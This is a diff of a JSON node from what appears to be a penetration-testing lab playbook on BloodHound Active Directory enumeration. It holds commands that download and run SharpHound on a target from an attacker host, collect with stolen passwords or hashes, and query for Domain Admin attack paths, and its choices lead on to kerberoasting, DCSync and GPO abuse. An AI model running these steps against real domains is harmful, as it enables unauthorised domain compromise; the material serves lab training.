@@ -1,58 +1,46 @@
 {
   "id": "bloodhound",
   "phase": "AD",
-  "title": "BloodHound",
-  "body": "Run this early and let it collect in the background. BloodHound will show you paths you'd never find manually. Shortest Path to DA is your first query.",
-  "cmd": "# bloodhound-python from Kali (no agent needed)\nbloodhound-python -u user -p 'pass' \\\n  -d domain.com -ns $ip -c All\n\n# Or SharpHound from Windows target\niwr http://$lhost/SharpHound.exe -OutFile C:\\Windows\\Temp\\sh.exe\n.\\sh.exe -c All --zipfilename bh.zip\n\n# Start BloodHound\nsudo neo4j start\nbloodhound\n\n# Key queries to run immediately:\n# 1. Shortest Path to Domain Admins\n# 2. Find AS-REP Roastable Users\n# 3. Find Kerberoastable Users\n# 4. Find Principals with DCSync Rights\n# 5. Computers Where Domain Users are Local Admin",
-  "warn": null,
+  "title": "BloodHound — Collection, Ingestion, and Key Queries",
+  "body": "BloodHound is the first thing to run once you have domain credentials on any Windows box. It maps every ACL edge, group membership, session, and trust in the domain and shows you the exact shortest path to DA. Run it early and let it work in the background while you do other things.\n\nTwo collection methods — pick based on your situation:\n\nbloodhound-python from Kali (preferred when you have creds but no shell yet, or the target has AV): runs entirely from Kali over LDAP/SMB, no binary on target needed. Requires DNS resolution of the DC — add it to /etc/hosts first if needed.\n\nSharpHound from a shell on the target: faster, more complete (local admin sessions), but requires a binary on disk. AV may flag it.\n\nCritical .NET issue — SharpHound 2.x requires .NET 4.7.2+. Windows Server 2016 and older workstations often have lower .NET. If you get 'The .Net Runtime is not compatible', use SharpHound v4.3.1 which targets .NET 4.5 and runs on anything from Server 2008 R2 onward.\n\nAfter ingestion, the most important action is marking accounts as Owned — without this, 'Shortest Path from Owned' returns nothing. Mark every account you have credentials for.\n\nThe four queries that matter most on OSCP/PG labs in order: Shortest Paths from Owned Principals → Find GPOs where users can modify → Kerberoastable users → AS-REP roastable users.",
+  "cmd": "# ══════════════════════════════════════════════════\n# METHOD 1 — bloodhound-python from Kali (no binary on target)\n# ══════════════════════════════════════════════════\n# Add DC to /etc/hosts first:\necho '<dc-ip> dc01.domain.com domain.com' | sudo tee -a /etc/hosts\n\n# Run collection:\nbloodhound-python -u '<user>' -p '<pass>' -d <domain> -ns <dc-ip> -c All --zip\n# With hash:\nbloodhound-python -u '<user>' --hashes '<lm>:<nt>' -d <domain> -ns <dc-ip> -c All --zip\n# Output: 20260708_BloodHound.zip in current directory\n\n# ══════════════════════════════════════════════════\n# METHOD 2 — SharpHound from shell on target\n# ══════════════════════════════════════════════════\n# Check .NET version first (release >= 461808 = 4.7.2+):\n(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full').Release\n\n# >= 461808 → use current SharpHound:\niwr http://<kali>:<port>/SharpHound.exe -OutFile C:\\tmp\\sh.exe\n.\\sh.exe -c All --zipfilename bh_out.zip\n\n# < 461808 → use v4.3.1 (targets .NET 4.5, runs on Server 2008R2+):\nwget https://github.com/BloodHoundAD/BloodHound/raw/v4.3.1/Collectors/SharpHound.exe -O SharpHound_v4.exe\n# Upload and run:\niwr http://<kali>:<port>/SharpHound_v4.exe -OutFile C:\\tmp\\sh_v4.exe\n.\\sh_v4.exe -c All --zipfilename bh_out.zip\n\n# Download the zip back:\n# evil-winrm: download C:\\tmp\\bh_out.zip\n# or copy to SMB share\n\n# ══════════════════════════════════════════════════\n# START BLOODHOUND AND INGEST\n# ══════════════════════════════════════════════════\n# Community Edition (CE) - web UI at http://127.0.0.1:8080\nbloodhound-start      # Kali alias\n# Default creds: admin / admin (or whatever you set)\n\n# Ingest: drag-and-drop the .zip into the BloodHound web UI\n# Or use Quick Upload button\n\n# ══════════════════════════════════════════════════\n# AFTER INGESTION — DO THESE IN ORDER\n# ══════════════════════════════════════════════════\n# 1. MARK ALL YOUR OWNED ACCOUNTS\n#    Search for each username → right-click → Mark as Owned\n#    (Shortest Path from Owned returns nothing until you do this)\n\n# 2. RUN THESE QUERIES (Pathfinding tab):\n#    Source: <your owned user>  →  Destination: DOMAIN ADMINS@domain\n#    = shortest attack path\n\n# 3. CYPHER QUERIES (Analysis tab → Custom Queries):\n# All users with GenericWrite/GenericAll on GPOs:\n# MATCH (u)-[r:GenericWrite|GenericAll|WriteDacl|WriteOwner]->(g:GPO) RETURN u,r,g\n\n# DA shortest paths from ALL owned:\n# MATCH p=shortestPath((o:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.COM'})) RETURN p\n\n# Kerberoastable:\n# MATCH (u:User {hasspn:true, enabled:true}) RETURN u.name,u.description\n\n# AS-REP:\n# MATCH (u:User {dontreqpreauth:true, enabled:true}) RETURN u.name\n\n# ══════════════════════════════════════════════════\n# BUILT-IN ANALYSIS QUERIES TO RUN\n# ══════════════════════════════════════════════════\n# In Analysis tab:\n# → Shortest Paths to Domain Admins\n# → Find Principals with DCSync Rights\n# → Find GPOs where Domain Users can modify  ← KEY for GPO abuse\n# → Find Computers where Domain Users are Local Admin\n# → Shortest Path from Owned Principals       ← needs Mark as Owned first\n\n# ══════════════════════════════════════════════════\n# TROUBLESHOOTING\n# ══════════════════════════════════════════════════\n# 'FindAll returned 0 results' — DNS issue, DC not reachable, or wrong domain\n# Test: python3 -c \"import ldap3; print(ldap3.Server('<dc-ip>').info)\"\n\n# bloodhound-python auth error — try with --auth-method ntlm\nbloodhound-python -u user -p pass -d domain -ns <dc-ip> -c All --zip --auth-method ntlm\n\n# CE database empty after import — check neo4j is running:\nsudo systemctl status neo4j",
+  "warn": "The single most common mistake: not marking accounts as Owned before running 'Shortest Path from Owned'. Without marking, the query returns nothing and you think there's no path. Mark every account you have creds for — including service accounts and computer accounts. BloodHound v4.3.1 collectors (SharpHound_v4) output data compatible with BloodHound CE — the version mismatch warning is cosmetic, the data still imports and works.",
   "choices": [
     {
-      "label": "Open full BloodHound guide",
-      "next": "bloodhound_guide"
-    },
-    {
-      "label": "Validate path with PowerView",
-      "next": "powerview_commands"
-    },
-    {
-      "label": "Validate sessions with PsLoggedOn",
-      "next": "ad_loggedon_playbook"
-    },
-    {
-      "label": "Kerberoastable accounts found",
-      "next": "kerberoast"
-    },
-    {
-      "label": "AS-REP Roastable accounts found",
-      "next": "asrep_roast"
-    },
-    {
-      "label": "ACL abuse path found",
-      "next": "acl_abuse"
-    },
-    {
-      "label": "WriteDacl/GenericWrite on a GPO — exploit it",
+      "label": "BloodHound shows GenericWrite on GPO → GPO abuse",
       "next": "gpo_abuse"
     },
     {
-      "label": "Need fresh collection — full bloodhound-python walkthrough",
-      "next": "bloodhound_authenticated"
+      "label": "BloodHound shows Kerberoastable users",
+      "next": "kerberoast"
     },
     {
-      "label": "Delegation abuse path found",
+      "label": "BloodHound shows AS-REP roastable users",
+      "next": "asrep_roast"
+    },
+    {
+      "label": "BloodHound shows ACL abuse path (GenericAll/WriteDacl)",
+      "next": "acl_abuse"
+    },
+    {
+      "label": "BloodHound shows DCSync rights",
+      "next": "dcsync"
+    },
+    {
+      "label": "BloodHound shows delegation",
       "next": "delegation"
     },
     {
-      "label": "AD CS vulnerable templates",
-      "next": "adcs"
+      "label": "No obvious path yet — enumerate manually",
+      "next": "powerview_commands"
     },
     {
-      "label": "BloodHound found nothing useful",
-      "next": "ad_manual"
+      "label": "Back to AD start",
+      "next": "ad_start"
     },
     {
-      "label": "No direct path — password spray",
-      "next": "ad_spray"
+      "label": "Back to jump menu",
+      "next": "jump_menu"
     }
   ]
 }
